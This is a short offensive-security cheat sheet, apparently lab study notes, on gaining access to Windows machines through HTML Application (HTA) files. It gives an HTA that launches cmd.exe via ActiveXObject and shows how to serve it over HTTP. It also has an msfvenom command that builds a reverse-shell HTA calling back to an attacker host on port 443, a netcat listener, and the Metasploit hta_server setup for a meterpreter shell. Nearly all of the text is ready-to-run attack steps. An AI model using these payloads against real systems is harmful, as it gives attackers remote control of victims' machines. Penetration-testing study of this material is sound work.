# HTML Application (HTA)

Use an `ActiveXObject` to execute `cmd.exe` (save as payload.hta):

    <html>
    <body>
    <script>
            var c= 'cmd.exe'
            new ActiveXObject('WScript.Shell').Run(c);
    </script>
    </body>
    </html>

Serve the payload 

    python3 -m http.server 8000

Visit the page from the target machine http://IP-ATTACK-MACHINE:8000/payload.hta and run it

## Reverse shell

Create a reverse shell with msfvenom:

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP-ATTACK-MACHINE LPORT=443 -f hta-psh -o thm.hta

Set up a listener on the attack machine: 

    nc -nlvp 443

The reverse shell is launched when the link is visited from the target machine.

You can also generate and serve HTA with Metasploit

    use exploit/windows/misc/hta_server

and set LHOST, LPORT, SRVHOST, and payload `windows/meterpreter/reverse_tcp`.

When the link is visited in the target we get a meterpreter shell.
